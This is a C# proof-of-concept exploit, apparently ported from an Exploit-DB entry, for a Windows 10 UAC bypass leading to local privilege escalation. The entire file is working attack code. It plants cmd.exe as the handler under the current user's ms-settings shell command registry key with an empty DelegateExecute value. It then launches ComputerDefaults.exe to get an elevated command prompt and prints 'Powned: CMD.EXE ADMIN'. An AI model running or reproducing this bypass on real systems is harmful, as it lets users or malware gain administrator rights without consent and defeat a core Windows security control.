using System;
 
using System.Runtime.InteropServices;
 
namespace PocDOTNET
{
/*	
# Exploit Title: Microsoft Windows 10 - Local Privilege Escalation (UAC Bypass)
# Author: Nassim Asrir
# Date: 2019-01-10
# Exploit Author: Nassim Asrir
# CVE: N/A
# Tested On: Windows 10Pro 1809
# Vendor : https://www.microsoft.com
*/

    class Program
    {
        static  string  cmd = @"C:\windows\System32\cmd.exe";
        static string detalils = @"C:\windows\system32\ComputerDefaults.exe";
        [DllImport("kernel32")]
        public static extern long WinExec(string IpCmdLine, int nCmdShow);  
        static void create_reg_key(string keyName, object value )
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
            key.SetValue(keyName, value);
            key.Close();
            System.Threading.Thread.Sleep(450);
        }

        static void exec_bypass_uac(string cmd)
        {
            create_reg_key("DelegateExecute", "");
            create_reg_key(null, cmd);
        }

        static void  banner()
        {               
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("/************************************************************/");
            Console.WriteLine("/                   UAC bypass PoC C#                        /");
            Console.WriteLine("/          https://www.exploit-db.com/exploits/47915         /");
            Console.WriteLine("/               PoC C# Version -  Martin Torres              /");//
            Console.WriteLine("/************************************************************/");
            Console.WriteLine(" "); 
        }
        static void Main(string[] args)
        {
            try
            {
                banner();
                System.Threading.Thread.Sleep(300);
                Console.ForegroundColor = ConsoleColor.Green;                  
                exec_bypass_uac(cmd);
                Console.WriteLine("*Escribiendo Valores en el Registro de Windows");
                Console.WriteLine("*" + cmd + " cargado");
                System.Diagnostics.Process.Start(detalils);
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Powned: CMD.EXE ADMIN");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error de carga. " + ex.Message);
            } 
        } 
    }
}
